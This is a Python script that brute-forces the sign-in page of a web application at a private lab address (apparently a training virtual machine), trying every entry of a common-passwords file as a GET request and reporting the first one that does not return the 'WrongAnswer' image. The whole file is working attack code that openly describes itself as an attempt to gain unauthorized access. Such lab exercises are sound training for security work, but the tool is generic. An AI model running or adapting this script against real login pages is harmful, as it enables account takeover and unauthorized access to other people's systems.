import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import signal
import readchar

URL = "http://192.168.56.101/?page=signin"
PASSWORDS_FILE_PATH = "./common_passwords.txt"
WRONG_ANSWER_IMG = "images/WrongAnswer.gif"

#############################################################################
#                                   UTILS                                   #
#############################################################################

# Create a requests session with retry configuration
session = requests.Session()
retry = Retry(connect=3, backoff_factor=0.5)
adapter = HTTPAdapter(max_retries=retry)
session.mount('http://', adapter)

# Ctrl-C Handler
def ctrl_c_handler(signum: int, frame) -> None:
    msg = "\nCtrl-c was pressed. Do you really want to exit? y/n "
    print(msg, end="", flush=True)
    res = readchar.readchar()
    if res == 'y':
        print("")
        exit(1)
    else:
        print("", end="\r", flush=True)
        # clear the printed line
        print(" " * len(msg), end="", flush=True)
        print("    ", end="\r", flush=True)

# Register the handler function for SIGINT (Ctrl-C)
signal.signal(signal.SIGINT, ctrl_c_handler)

def print_colored_message(message, color=Fore.LIGHTWHITE_EX, end='\n', flush=False):
    print(color + message + Style.RESET_ALL, end=end, flush=flush)

def get_request(url: str) -> None:
    try:
        # Send a GET request to the URL
        response = requests.get(url)
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            return response.content
            
        else:
            error_message = f"Error: Unable to fetch content from {url}. Status code: {response.status_code}\n"
            error_message += f"Response content: {response.text}"
            print_colored_message(error_message, Fore.RED)
    except requests.RequestException as req_exception:
        print_colored_message(f"Request error: {req_exception}", Fore.RED)
    except Exception as e:
        print_colored_message(f"Error: {e}", Fore.RED)


#############################################################################
#                                  LOGIN                                    #
#############################################################################

def login(username: str, password: str) -> bool:
    # Build login url
    url = URL + "&username=" + username + "&password=" + password + "&Login=Login#"
    # Try to login
    content = get_request(url)
    if WRONG_ANSWER_IMG in content.decode():
        print_colored_message(f"\033[KUsername: '{username}'   Password: '{password}'", Fore.RED, end='\r', flush=True)
        return False
    print_colored_message(f"\033[KUsername: '{username}'   Password: '{password}'", Fore.GREEN)
    print_colored_message(f'Url: {url}\n', Fore.BLUE)
    return True

def test_common_passwords(username: str) -> None:
    # Read passwords list from an external file
    with open(PASSWORDS_FILE_PATH, 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()
            result = login(username, password)
            if (result == True):
                return

#############################################################################
#                                   MAIN                                    #
#############################################################################

def main():
    print_colored_message(f"\nBrute force attack using commonly used passwords")
    print_colored_message(f"Attempt to gain unauthorized access to the login page : {URL}\n", Fore.WHITE)
    test_common_passwords("username")

if __name__ == "__main__":
    main()